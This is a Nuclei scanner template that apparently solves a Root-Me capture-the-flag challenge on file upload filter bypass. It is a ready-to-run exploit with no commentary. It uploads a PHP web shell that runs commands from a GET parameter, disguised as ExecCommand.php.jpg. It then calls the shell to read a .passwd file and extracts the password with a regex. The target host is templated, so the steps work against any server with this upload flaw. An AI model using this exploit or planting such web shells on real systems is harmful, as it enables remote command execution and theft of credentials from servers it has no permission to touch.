id: Fileupload-Doubleextensions
info:
  author: Tomitom13
  name: File upload - Double extensions
  severity: unknown
  tags: file-upload,rootme
requests:
- extractors:
  - internal: true
    kval:
    - PHPSESSID
    name: phpsessid
    type: kval
  - name: password
    part: body
    regex:
    - '[a-zA-Z0-9!@#$%^&*()\-_+,.]+'
    type: regex
  matchers:
  - status:
    - 200
    type: status
  - part: body
    regex:
    - '[a-zA-Z0-9!@#$%^&*()\-_+,.]+'
    type: regex
  matchers-condition: and
  raw:
  - 'POST /?action=upload HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBgfCQBboc2lAtacJ



    ------WebKitFormBoundaryBgfCQBboc2lAtacJ

    Content-Disposition: form-data; name="file"; filename="ExecCommand.php.jpg"

    Content-Type: image/jpeg


    <?php

    system($_GET[''command'']);

    ?>

    ------WebKitFormBoundaryBgfCQBboc2lAtacJ--


    '
  - 'GET galerie/upload/{{phpsessid}}/ExecCommand.php.jpg?command=cat+../../../.passwd
    HTTP/1.1

    Host: {{Hostname}}


    '
